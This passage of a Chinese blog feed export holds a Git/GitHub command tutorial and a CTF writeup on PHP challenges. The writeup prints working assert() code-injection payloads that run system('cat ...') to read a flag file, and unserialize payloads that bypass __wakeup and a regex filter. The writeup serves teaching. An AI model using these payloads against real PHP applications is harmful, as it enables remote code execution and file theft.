6653c33defceae77c3f6f4d2aeb9f29c84e3a04947786daac6054616dbf13423220dc0741af6cb3714531905dc0a2b95d20a7f5283e341c1a0d7cc2e9b61cbe863a8fbb7143f25e7ed14f63d5bd0d0633564cae99ef97f48fe8ae7e55db9f1c1247762d8d0ef319973f2283dc357ac6d7f50c3f630a5b5cda6d5a3581e003122ddb762876a3b2535c13dc6f84904ff331f1692514dfebc9680bfe38ce8bdf84a1bfccf39a7fd6d2310c91889d24476bbba761c96e2c94f7d80916cefdddf19adab9c120153d5ae0175c075f73aee7a4e7c2485b21a9f2c0746d1ffb22b75c94414daa2fd2d1a45f6dd472dde84c4ed0e6958d9b3998e8e5f658fb6a8b05f1c50851d5954ede0e19aa116529dc99c5e0c479514b985c67f4dbcf27baba1f0c16d19e4da98eeaa60a7637794fec6d2ec9d820abc61bbbb5f595115e5180be7bba16de317a2d804aced5a1c607e5456a36bc07b312937d93252a59cfb8045ee5297fc4335fc07bc3654121e36c1c7ed02b8f559930d7792bc04034051621793c86950c01892176be330ea5088d1a94160d87d6f3d0a1e773e923d000320109117b524a5774f8b262ee9a6f97560972f22087655d131f9b41672e9a54bd47d172e84902d1f69877fe5d78d41c02012253da95caaa9f9398f4a53bade7fde858b639fa600b89cd7ab4bdc396cb5c4dc5648f018264d9ba8fe5e13a2df2aa1cff69c5725111669e372fae92c557b4939131864800abf22f1a9e6a9a4cc32407a4ac53d0dcffe3611d413fd22941838e13200575e16319ee6dfab734dc73829286cb0235d6f9e4697af124844000e828c8a647e42f463ae930b86db89bbe7ad80ff705f38577808d229caa7d0e8c5a9daeb0e0863277ab46f81a2644f53828118dc68cc6a43e39eee6726ff53973cede103b4e265c94d1cd8100df1b6aad593a853a6906496e09ef0bc26dfb105675dd7d5735ca89d791d0212c88c066666ac82ae5851f214c0dbcc1996eb6356e72006d0b4bce0f52adcef3a75b90bada6740e3cd8b9f2c34bbb64d26a7ed8e5777d0da8ae4592a906b941b86c480f7424a5a5a0a978894e11ac16a59ea7ebe26d042fbe55bae4c18fc0da4ee0c69e9608307d752ed088bc193617beafba2771c38de595a40053de8fcef1384d348cac2985c6982d1ad67e2127d08b5c61c22fd07766745d47689218168b830baf81adc29b639b66b33c6194088dfec508264d7077ded0fd3e25ae1403d26b2b1531c05e58fbc75531b0775cf4786d1b2d7d1f5afa70b50b9b3c9e36dcb2971501f183fecfb3952fabcac8ce3dc93c105da54f17926c133c1de99ba2e8da5cafcf07b78499a75be147d7d3d43d36501358e4aaae07f1ba61fcebbf06f1852c9d201935b7cb859431da25eb0dfc4e92a9ca4523f35656d62f580e912cd39f14202f571387920ed9549a1cbb0de4d96389037bbeaa4fe5c4bba291139aeaafefee11829103f805dca421256a779e30caf813ba5640876862192f727097144fca6e5f56bb71994444e23efa41fb588b972ec91c4201eecc8c474dc1ed2ee0c1802842f2c273f6433226af6bc04ce8ce5ed78c6e82aede865e85d2a8ea0834f216a423e2e56159464c92a416a2ee36537c01e8a20db1d0cfd125fc1c4d8068c7298dffb5580bcb396e33f6f5a0c434870f00fed61f578c7cdda65ffdc2fdb4502a4ceae3e100479acf9738c324d34c11a91a43f72694fc6f3d855f5ba48427111e6245575c86b236bb6eed71b45c3389e4cc838d9ba6771c0583273c11a232b7f2cbcbd9540476bdc4744975a01b915121c9683751202db2c7a641f4e18ea67763cc2f5093527bb6dba23559ee829e23e8c9f0bf120da40760fafae1333b2d668cf5eb642a2f36dadfd121afc8e4bc25d26f93f9df6e8b20f7b76b198abfbd84c84b72a982c014ab702db962070f7ad3e385cd29a2b7b1f3eeac8658107df6b642f4a3d4eae829ff711dc0734e2d2d53a52d0073579eecdd15e3c3c9f46a95d8b40c650537a84d9d3cc8974184348454ffb170ef3c6ea2adb238b71b33b32fe7faa4cf8fa29c4c2a1617864f0feedd096368a9baadab8056413b18d493c85fc9adfd5e19a2a502a17d1c3d234ee2e895a45c6269e9a275471fc74bdb3a58d1475f4e3db8e36d1d683dd462fd22c6b04b553e5e5c9da84b04f08fb24a9b544c0cbfdd039e86052bb6eb25b99ea338a06f19c98a8550f25338d61f6a819255d284196379fcff18ebeca654efce18dd238f0c55c02507283659191717d36c394582b787d460ab43fae48f1e0c5bbd89d84a3a1a75ce1c1a06d1335623b8c2aaa0c0dc1ae903cac43e9e272601c6bc191f6aa27f99e7414cf87cd4c61a72740afce5fa52771430e7152e2019feef25a32a6d0ad9ba5bb533aec76c313df14a907347bf7f2bae7021baa173be80fc9dc94b95ae61e10e57f628d4ee00e9696fd90ffae5e0cd40aded6878a3a2324e282e2a1b1dbb1ad1dc4fadcbda616d2f165f99271f0dd6123682108366208939ca7e8bdd3ef79cb760a68f15fb7ad674a3e7ed731a77881d1578d5159be56930c6eacf69b8497b10a48439b4219ded8afa1bd273f42f287aa824076854241327db4b30bda8ab9aaa6b0cdffd8ae184fb15e40f66c98f4896e067b6b1dcc9002d91ce4db1f7f3d752a6f046c1a397cd4d0283ef0eb3bc9da5044cfe869d3146d6cb83f5e9db6c4be42f75d67b9d57aa210914febafd0a0861852146374e701882f8091e71d7d635716e30c05d58fe81e0262235aeeec58009e876b93cf5d7246054c4e4c3e62cd471fc1bdfe0e2aaf1fad6183ef536fab6d967fd0696c525e65c622e4c903192abb925ea535ba12abec33f9d84bf99561264db7456fbc75ab4b7db2304b4b99644c1c803e6460e4de48a61afe864add2bec32e04b2c4ae4ed724c9759a6b3fa08e389bfdc35799b3f3462b0d18927394a1861356a38103379d33279ff778d9022fca9d60ce85c5addd84082e82fe00f1410f6d2827a29d5fefe8db92e9fb6080c136fa7c1754542e81b1a5709bfd23c15154c341573f80fcc50fcad4980e8417a301dd1065832c24ff86a5f74aea5cf79c0f9a03c1bf311cf7e6b924a4b5f62f84d0de12d276e4b1eefb09eed11c496b051ac3d26fbfed416f3d32bd649b0973e160fbd8e31594a1d116ee53282a5a9e586fe4bb66262dc7cb3900bfb5587f54dbbbeef871991939a2fa0fea308f9636d2b2be136fae68ffff1278e4c7581aae407b43a00a122f929fc6d69d5cfe86871439ae503af63574632b024b4bdc9f568499647ae068f3811ba40e89e8d2cca685c74dd21dcc4f1d8224f7b3f91c5af8835352813ba970129d1b0991bcdf110562054180bf5efba97405196399964c993748316037c0241cca4b8ae4ed853c7513d8a23a64cd20dc7ef342f18e8eddd15b185d8748130e78e3065582380b2781d783a3908d88c2258f17819d05634925915853812b97c64458d62b0fd7922ddb5b2895894fc3afa91c08f8d0227dd61a981c006dba23f9115b5bbca4ee2c61f479842bf4076d07423ccd42ee6d995cf4dcc0d098ceb88b226c0aeba97f4d5dff45a7fd72b69ac410ef0cb1dcb6c115f7ad7ae4f4471c6d8a06966eb6dcb05c481eec7c7b7edf5e413712d52e6f600f7c001ff0554db29d5a61ab01d9a362b2824809dc9e3a9e1fa6ce4b798b8d1006dbcc91ac77310aea5ecd500621da0d6b57938ee5489c843785e7afd270398139e03f2526032affce259c337e533ee973ad1451244f912a0e99cacedd17cf6a96d1022dc84fc8836d68b0da8d5f98cbc4f95607446cc1c68eb377cc7c380242ee2af6a52ef9c780507a04f815c0b0dd50b22cdba5a9e63a6ed8e4089e7de31dfb97b00fba03af3156eb8abf49a7f592ca63941a4e110e31548bd3a567ebd2726cd0de0d28900594456fa492bd8934143ba5bb511a6b57eaaf806ee79a99e18a872cfadc87f6a3447e9639832f2f2a6776bd987ad6c94281b91ed1e92c44a98bc3394f971bcdf6e4c6ad758d9134bac8183eae36acf7f262ac72670d2c6aa19fde9c60a3d4adac7bb2c2c5832b7d4b4b77e440e87b3489b921d68e26c53e3fd00483ca8881f48f30f83b908c4f140e692c524f5c1078fc66b3758b40982900b1aa351f6575200ca928b752b9bc67bfd7c40125777c952cbdb707448ee66ae054553d8f0805ca2a12573c30633a2f111d1aad231d897bcbbc31effaf0c5a77d5f0b78dd1266f318bdb13ebb3e9958164fb554de6a9341a0c1890f13cf0c55304484deeca7fcf1d2e97a36616b467db9b870a5715ad689cc9dc1d0766ee7b867327e59babac5f78b0ec10f55b9d71d57b643f4e99318d7c5a811b07bed91d893cc8c126b264491c71d52f60acc994cee65d5bb787e10e08abb2746d9aaa071132767409fc189a0ce12eb46e008121e8a1f784376cd3c9a2321846821b05cda338adff8afd3360497d655c86ae9e7765281bb75589a93ba25e14a25527166b8e2edecdba305899acbd0cd2d18ab4d61991ae67578a710bbe5be9a7703550085c0986286c7cb56d00c3919aeaa09b83bb8e984171232c5d69a90c59dbc908dbbdc94d680ea0cbccfbd489aca95193ef74241aa431480bc9a211601ccf7b739db1418f9cd6074dc8462c3037e930095a4f1b356157dda74dd9633e0b8a573452f1981728df999739ae6103c3f10edb3032c4cf51cfee5700445282236a1fac1ab23d4f59dcad78ad56d289a421999bbac2ca384330949f5eea50b36e79482a8fc28a8d47f0831685a5530e174f1aaf40477bb4723c3518cbb0dec2cf57e8294b445f09057416ccd7c3d82862b62d2bb9f4859dcde57cdb61dc5013b4edc881002d7498c64ff465e0009ceaada4c178d647a1f83c2bc890fe2dbf2a31ca857e2a96c77f69b390194d32fec6715c7b969d003cba2d3bc72ea2e6470021b067267b06828613928adfdcfa72d0275c4166138d745c55abc774618a1e493566a7ea718d1135a72a55123fb43f8b7adde096fe8b74dbf504eb1b57f8fd9add5890c61c402044f2000ebb7da81480aef35266dce74f0cea5e4b311dc20a15bac5019f177645bd6fd98249ca64664a0ccfaed2acbfcac083eb947936605e3802b7bd5aa3957ce15d0b806ddee37896b345540f63d1eec6990a2a5eb31cbbd0563094a93f8ce06ad22ca46c8137a52cb81f05418a99b13a9570b276ef7fca4a26504aabcda3d757d1ced86dde2209c0b1c40963c600845d9cca8f5c8c8ad6649f1df01798f6ea608c1e5a223a730ac65d433a70d262c24625b340d3db421308e912f254997b921b03b4cd2e440d3a81939196f4b8a9ac847f7eb8776f42cfc746fcb20a46bf55a65bd1248a29abc9e725648abe7b15c3588aae77af49]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git以及Github的使用教程]]></title>
    <url>%2F2020%2F07%2F29%2F2020.07.29%EF%BC%88143%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、Git 教程1.Git 介绍&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Git (/ɡɪt/) is a distributed version-control system for tracking changes in source code during software development.[8] It is designed for coordinating work among programmers, but it can be used to track changes in any set of files. Its goals include speed,[9] data integrity,[10] and support for distributed, non-linear workflows.[11] Git was created by Linus Torvalds in 2005 for development of the Linux kernel, with other kernel developers contributing to its initial development.[12] Its current maintainer since 2005 is Junio Hamano. As with most other distributed version-control systems, and unlike most client–server systems, every Git directory on every computer is a full-fledged repository with complete history and full version-tracking abilities, independent of network access or a central server.[13] Git is free and open-source software distributed under the terms of the GNU General Public License version 2.—wiki Git是一个分布式版本控制系统，用于在软件开发过程中跟踪源代码的变化。它是为协调程序员之间的工作而设计的，但可用于跟踪任何文件集中的更改。其目标包括速度数据完整性以及对分布式非线性工作流的支持。 Git由Linus Torvalds于2005年创建，用于Linux内核的开发，其他内核开发人员也为Git的初始开发做出了贡献。自2005年以来，它的当前维护者是Junio Hamano。与大多数其他分布式版本控制系统一样，与大多数客户端服务器系统不同，每台计算机上的每个Git目录都是具有完整历史记录和完整版本跟踪功能的成熟存储库，而与网络访问或中央服务器无关。 Git是根据GNU通用公共许可版本2的条款分发的免费和开源软件。 2.安装GitLinux 1sudo apt-get install git Windows 在Windows上使用Git，可以从Git官网直接下载安装程序，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！ 配置Git用户名 这要和配置github的信息要区分开来 12$ git config --global user.name "Your Name"$ git config --global user.email "email@example.com" 3.创建版本库&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先有必要了解一下版本库的工作区和暂存区： 如上图所示，工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库，上图就是在演示将文件从工作区移到版本库中，分为了两步。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。 一定要在空目录下创建 初始化 将自己创建的空目录变为Git可以管理的仓库 1$ git init 把文件添加到版本库 第一步，用命令git add告诉Git，把文件添加到仓库： 1$ git add fileName 第二步，用命令git commit告诉Git，把文件提交到仓库： 1$ git commit -m "&lt;本次提交的说明&gt;" 查看仓库当前状态 1$ git status 4.修改文件 查看修改的内容 1$ git diff fileName 5.版本回退查看历史记录 显示从最近到最远的提交日。 需要友情提示的是，你看到的一大串类似`1094adb...`的是`commit id`（版本号），和SVN不一样，Git的`commit id`不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的`commit id`和我的肯定不一样，以你自己的为准。为什么`commit id`需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，如果还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。 1$ git log 版本回退 1$ git reset --hard HEAD^/SHA1-ID 上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。 Git的版本回退速度非常快，因为Git在内部有个指向当前版本的HEAD指针，当你回退版本的时候，Git仅仅是把HEAD从指向回退前的状态改为指向回退后的状态，然后顺便把工作区的文件更新了。 查看每一次命令的信息 要重返未来，用git reflog查看命令历史，以便确定要回到未来的哪个版本。 1$ git reflog 6.撤销修改丢弃工作区的修改 1$ git checkout -- fileName 命令git checkout -- readme.txt意思就是，把readme.txt文件在工作区的修改全部撤销，这里有两种情况： 一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。 总之，就是让这个文件回到最近一次git commit或git add时的状态。 `git checkout -- file`命令中的`--`很重要，没有`--`，就变成了“切换到另一个分支”的命令 7.删除文件 在Git中，删除也是一个修改操作， 确实要从版本库中删除该文件 1234567$ git rm test.txtrm 'test.txt'$ git commit -m "remove test.txt"[master d46f35e] remove test.txt 1 file changed, 1 deletion(-) delete mode 100644 test.txt 二、Github使用1.创建SSH Key 在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key： 1$ ssh-keygen -t rsa -C "youremail@example.com" 如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。 2.登陆GitHub 打开“Account settings”，“SSH Keys”页面，然后点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容： 3.添加远程库情景 已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。 第一步 首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库 第二步 在Repository name填入learngit，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库 第三步 将本地git仓库和远程的github仓库关联起来 1$ git remote add origin " Your Github address" 第四步 把本地仓库的所有内容推送到远程库上 1$ git push -u origin master 把本地库的内容推送到远程，用git push命令，实际上是把当前分支master推送到远程。 由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。 此后，每次本地提交后，只要有必要，就可以使用命令git push origin master推送最新修改； 4.从远程仓库克隆克隆一个本地库 1$ git clone git@"github address" 5.创建与合并分支 HEAD严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点： 每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长。 当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上： Git创建一个分支很快，因为除了增加一个dev指针，改改HEAD的指向，工作区的文件都没有任何变化！ 不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变： 假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并： 所以Git合并分支也很快！就改改指针，工作区内容也不变！ 合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支： 创建dev分支，然后切换dev分支 1$ git checkout -b dev git checkout命令加上-b参数表示创建并切换，相当于以下两条命令： 12$ git branch dev$ git checkout dev 查看当前分支 1$ git branch 把dev分支的工作成果合并到master分支上 要先执行git add &quot;fileName&quot;和git commit &quot;fileName&quot;，才能进行合并 1$ git merge dev 注意到上面的Fast-forward信息，Git告诉我们，这次合并是“快进模式”，也就是直接把master指向dev的当前提交，所以合并速度非常快。如果合并分支时加上--no-ff参数：表示禁用Fast forward的区别： 1$ git merge --no-ff -m "merge with no-ff" dev 下图是加上该参数的情况 查看分支合并的情况 1$ git log --graph 6.删除分支删除分支 1$ git branch -d dev 强行删除分支 1$ git branch -D dev 7.解决冲突 Git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容，如下： 123456789Git is a distributed version control system.Git is free software distributed under the GPL.Git has a mutable index called stage.Git tracks changes of files.&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADCreating a new branch is quick &amp; simple.=======Creating a new branch is quick AND simple.&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1 我们修改如下后保存： 1Creating a new branch is quick and simple. 8.分支策略 首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。所以，团队合作的分支看起来就像这样： 9.Bug分支储存当前分支的工作现场 1$ git stash 从当前分支上切换到存在Bug的分支 1$ git checkout [branchName] 创建Bug分支 1$ git checkout -b issue-101 修复Bug 从bug分支上切换到存在Bug的分支 1$ git switch [branchName] 合并分支 1$ git merge --no-ff -m "merged bug fix 101" issue-101 切换到干活的分支 查看当前分支的工作现场 1$ git stash list 恢复当前分支的工作现场 1$ git stash apply ⇡ 恢复后，stash内容并不删除，你需要用git stash drop来删除； 1$ git stash pop ⇡ 恢复的同时把stash内容也删了 在不同的分支上同步修改bug的操作 比如我们在master分支上修复了bug，那么我们怎么同步到dev分支上呢？同样的bug，要在dev上修复，我们只需要把4c805e2 fix bug 101这个提交所做的修改“复制”到dev分支。注意：我们只想复制4c805e2 fix bug 101这个提交所做的修改，并不是把整个master分支merge过来。 为了方便操作，Git专门提供了一个cherry-pick命令，让我们能复制一个特定的提交到当前分支： 1$ git cherry-pick 4c805e2(master的sha1值) 10.多人协作查看远程库信息 12$ git remoteorigin 用git remote -v显示更详细的信息 推送分支 1$ git push origin "branchName" master分支是主分支，因此要时刻与远程同步； dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步； bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug； feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。 抓取分支 首先要克隆一个仓库，如果A在修改文件后push到远程仓库后，你也要push到远程仓库，那么会收到如下信息： 123456789101112131415161718$ cat env.txtenv$ git add env.txt$ git commit -m "add new env"[dev 7bd91f1] add new env 1 file changed, 1 insertion(+) create mode 100644 env.txt$ git push origin devTo github.com:michaelliao/learngit.git ! [rejected] dev -&gt; dev (non-fast-forward)error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: 'git pull ...') before pushing again.hint: See the 'Note about fast-forwards' in 'git push --help' for details. 推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用git pull把最新的提交从origin/dev抓下来，然后，在本地合并，解决冲突，再推送： 12345678910$ git pullThere is no tracking information for the current branch.Please specify which branch you want to merge with.See git-pull(1) for details. git pull &lt;remote&gt; &lt;branch&gt;If you wish to set tracking information for this branch you can do so with: git branch --set-upstream-to=origin/&lt;branch&gt; dev git pull也失败了，原因是没有指定本地dev分支与远程origin/dev分支的链接，根据提示，设置dev和origin/dev的链接： 12$ git branch --set-upstream-to=origin/dev devBranch 'dev' set up to track remote branch 'dev' from 'origin'. 再pull： 1234$ git pullAuto-merging env.txtCONFLICT (add/add): Merge conflict in env.txtAutomatic merge failed; fix conflicts and then commit the result. 这回git pull成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的解决冲突完全一样。解决后，提交，再push： 1234567891011$ git commit -m "fix env conflict"[dev 57c53ab] fix env conflict$ git push origin devCounting objects: 6, done.Delta compression using up to 4 threads.Compressing objects: 100% (4/4), done.Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.Total 6 (delta 0), reused 0 (delta 0)To github.com:michaelliao/learngit.git 7a5e5dd..57c53ab dev -&gt; dev 因此，多人协作的工作模式通常是这样： 首先，可以试图用git push origin &lt;branch-name&gt;推送自己的修改； 如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并； 如果合并有冲突，则解决冲突，并在本地提交； 没有冲突或者解决掉冲突后，再用git push origin &lt;branch-name&gt;推送就能成功！ 如果git pull提示no tracking information，则说明本地分支和远程分支的链接关系没有创建，用命令git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;。这就是多人协作的工作模式，一旦熟悉了，就非常简单。 三、命令总结123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107`配置用户名`$ git config --global user.name "Your Name"$ git config --global user.email "email@example.com"`初始化`$ git init`将文件添加到仓库`$ git add fileName`将文件提交到仓库`$ git commit -m "&lt;本次提交的说明&gt;"`查看当前仓库的状态`$ git status`查看修改的内容`$ git diff fileName`查看历史记录`$ git log`版本回退`$ git reset --hard HEAD^/SHA1-ID`查看每一次命令的信息`$ git reflog`丢弃工作区的修改`$ git checkout -- fileName`删除文件`$ git rm test.txt`将本地仓库和远程仓库关联起来`$ git remote add origin "Your Github repository name"`查看远程库信息`$ git remote`查看远程库详细信息`$ git remote -v`将本地仓库的内容推送到远程库`$ git push -u origin master`创建分支` +-----------------+$ git branch dev ++ +========== $ git checkout -b dev`切换分支` ++$ git checkout dev or $ git switch dev +-----------------+`查看当前分支`$ git branch `将dev分支合并到当前分支（启用Fast forward）`$ git merge dev`将dev分支合并到当前分支（禁用Fast forward）`$ git merge --no-ff -m "merge with no-ff" dev`查看分支合并的情况`$ git log --graph`删除分支`$ git branch -d dev`强行删除分支`$ git branch -D dev`储存当前分支的工作现场`$ git stash`从当前分支上切换到存在Bug的分支`$ git checkout [branchName]`创建Bug分支`$ git checkout -b issue-101`修复Bug（手动修复）``从bug分支上切换到存在Bug的分支`$ git switch [branchName]`合并分支`$ git merge --no-ff -m "merged bug fix 101" issue-101`切换到干活的分支``查看当前分支的工作现场`$ git stash list`恢复当前分支的工作现场（stash内容并不删除）`$ git stash apply`恢复当前分支的工作现场（stash内容删除）`$ git stash pop`在不同的分支上同步修改bug的操作`$ git cherry-pick 4c805e2(master的sha1值)`推送分支`$ git push origin "branchName"`抓取分支`$ git pull等价于：git fetch git merge &lt;Branch Name&gt;]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP相关题目writeup（持续更新）]]></title>
    <url>%2F2020%2F07%2F28%2F2020.07.28%EF%BC%88142%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 函数漏洞问题【Jarvois OJ-web】BabyPHP1.题目描述 2.GIT 源码泄露通过上图的提示，我们猜测是不是可以通过git泄露源码，从而进行得到php代码，有关GIT源码泄露的可以点击这里，有关git的介绍可以点击这里，下面我们得到如下的文件及文件夹： 3.查看index.php源码打开index.php源码，可以得到其中最为关键的一段代码，如下： 12345678910&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");assert("file_exists('$file')") or die("That file doesn't exist!");?&gt; 也就是说把我们输入的page相关字符串解析为assert(&quot;strpos(&#39;templates/payload.php&#39;, &#39;..&#39;) === false&quot;)，其中： strpos()：查找 “..” 在file字符串中第一次出现的位置，也就是说我们不能使用目录注入了 assert()：检查一个断言是否为 FALSE，如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 4.构造payload 根据上文，我们可以构造如下payload： 12payload1：page = '.system("cat templates/flag.php").'payload2：page = ','..')===False and system('cat templates/flag.php');// 被运行时，在index.php中被执行的形式为： 12345678$file = "templates'.system("cat templates/flag.php").'.php";assert("strpos('templates'.system("cat templates/flag.php").'.php"', '..') === false") or die("Detected hacking attempt!");assert("file_exists('templates'.system("cat templates/flag.php").'.php')") or die("That file doesn't exist!");$file = "','..')===False and system('cat templates/flag.php');//"assert("strpos('','..')===False and system('cat templates/flag.php');//', '..') === false") or die("Detected hacking attempt!");assert("file_exists('','..')===False and system('cat templates/flag.php');//')") or die("That file doesn't exist!"); 注：不是很明白为什么这样构造 0x01 反序列化问题基础知识 要想知道反序列化问题，就必须知道 1) 序列化后的数据格式；2) 触发/绕过魔术函数的方法； 问题一：序列化后的数据格式 12345678910111213141516171819&gt; &lt;?php &gt; class tes1t&gt; &#123;&gt; private $flag = "Inactive";&gt; protected $test = "test";&gt; public $test1 = "test1";&gt; protected $test2 = "test2";&gt; public function set_flag($flag)&gt; &#123;&gt; $this-&gt;flag = $flag;&gt; &#125;&gt; &#125; &gt; $object = new tes1t();&gt; $object-&gt;set_flag("Inactive");&gt; $data = serialize($object);&gt; echo $data;&gt; ?&gt; &gt; &gt; &gt; 上述代码产生的数据格式如下： 12&gt; O:5:"tes1t":4:&#123;s:11:"tes1tflag";s:8:"Inactive";s:7:"*test";s:4:"test";s:5:"test1";s:5:"test1";s:8:"*test2";s:5:"test2";&#125; &gt; &gt; 其中： O：表示一个对象 5：表示对象名占4个字符 “teslt”：表示对象名 4：表示该对象有4个属性（不含方法） private：tesltflag =&gt; %00teslt%00flag protected：test =&gt; %00\%00test 问题二：触发/绕过魔术函数的方法 首先介绍一下魔术方法： construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的) wakeup()：unserialize()时会自动调用，反序列化无论如何都是要先调用__wakeup函数的，但是当属性数值&gt;属性真实个数时，就会跳过执行__wakeup()函数 存在漏洞的PHP版本：PHP5.6.25之前版本和7.0.10之前的7.x版本 漏洞概述：__wakeup()魔法函数被绕过,导致执行了一些非预期效果的漏洞 漏洞原理：当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过 destruct()：当对象被销毁时会自动调用 toString()：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用 get()：当从不可访问的属性读取数据 call()：在对象上下文中调用不可访问的方法时触发 从序列化到反序列化这几个函数的执行过程是：先调用__construct()-&gt;__sleep-&gt;__wakeup()-&gt;__toString ()-&gt;__destruct() 【XCTF-web】unserialize31.题目描述123456class xctf&#123;public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= 2.题目分析 这里需要进行反序列化，并且要绕过 __wakeup 魔术函数，这里需要的知识点有： 将数据序列化后的数据格式是什么样子？ 如何绕过__wakeup函数？ 3.构造payload从上面的基础知识可以得到序列化后的数据格式，并且当对象的属性(变量)数大于实际的个数时，__wakeup()魔法函数被绕过，那么这里我们就可以构造出payload： 1?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;,s:3:&quot;111&quot;;&#125; 得到如下flag: 1the answer is : cyberpeace&#123;7d67cd73e3c53d91d218d6a75563f5e3&#125; 【XCTF-web】Web_php_unserialize271.题目描述123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = 'index.php'; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != 'index.php') &#123; //the secret is in the fl4g.php $this-&gt;file = 'index.php'; &#125; &#125; &#125;if (isset($_GET['var'])) &#123; $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\d+:/i', $var)) &#123; die('stop hacking!'); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file("index.php"); &#125; ?&gt; 2.题目分析我们一部分一部分的分析： 1$var = base64_decode($_GET['var']); 对我们输入的payload进行base64解码，也就是说我们输入的payload要经过base64编码 1if (preg_match('/[oc]:\d+:/i', $var)) 也就是说我们解码后的输入的形式如果是[oc]:\d+:（不区分大小写）则会输出stop hacking，但是如果我们的输入是O:+4:，就可以绕过正则过滤 1@unserialize($var); 反序列化我们的var值 1function __wakeup() 如果执行反序列化，那么就得执行该函数，所以和上一道题目一样，我们需要绕过该函数。 3.构造payload根据上文分析，我们可以构造如下的payload： 1O:+4:2:&#123;s:10:"\x00Demo\x00file";s:8:"fl4g.php";&#125; 